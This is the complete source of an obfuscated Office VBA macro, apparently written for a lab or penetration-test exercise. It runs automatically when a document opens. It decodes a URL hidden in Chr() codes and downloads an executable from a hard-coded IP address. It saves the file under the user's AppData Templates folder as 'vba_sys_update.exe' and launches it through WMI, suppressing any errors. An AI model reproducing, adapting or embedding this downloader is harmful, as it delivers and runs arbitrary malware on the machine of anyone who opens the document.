Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim d_1 As String, d_2 As String, d_3 As String
    Dim o_1 As Object, o_2 As Object, o_3 As Object
    
    d_1 = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & _
          Chr(49) & Chr(57) & Chr(50) & Chr(46) & Chr(49) & Chr(54) & Chr(56) & Chr(46) & _
          Chr(52) & Chr(53) & Chr(46) & Chr(50) & Chr(52) & Chr(50) & Chr(47) & _
          Chr(106) & Chr(97) & Chr(118) & Chr(97) & Chr(46) & Chr(101) & Chr(120) & Chr(101)


    d_2 = Environ(Chr(65) & Chr(80) & Chr(80) & Chr(68) & Chr(65) & Chr(84) & Chr(65)) & _
          "\Microsoft\" & "Templates\" & "vba_sys_update.exe"

    Dim n_1 As String: n_1 = "MS" & "XML2" & ".Server" & "XMLHTTP" & ".6.0"
    Dim n_2 As String: n_2 = "AD" & "ODB" & ".St" & "ream"
    
    On Error Resume Next
    

    Set o_1 = CreateObject(n_1)
    o_1.Open "G" & "ET", d_1, False
    o_1.Send
    
    If o_1.Status = 200 Then
        Set o_2 = CreateObject(n_2)
        o_2.Open
        o_2.Type = 1
        o_2.Write o_1.ResponseBody
        o_2.SaveToFile d_2, 2
        o_2.Close
    Else
        Exit Sub
    End If

    d_3 = "win" & "mgmts" & ":" & "\\" & "." & "\root\cim" & "v2:Win32_Process"
    Set o_3 = GetObject(d_3)
    
    o_3.Create d_2, Null, Null, 0

    Set o_1 = Nothing: Set o_2 = Nothing: Set o_3 = Nothing
End Sub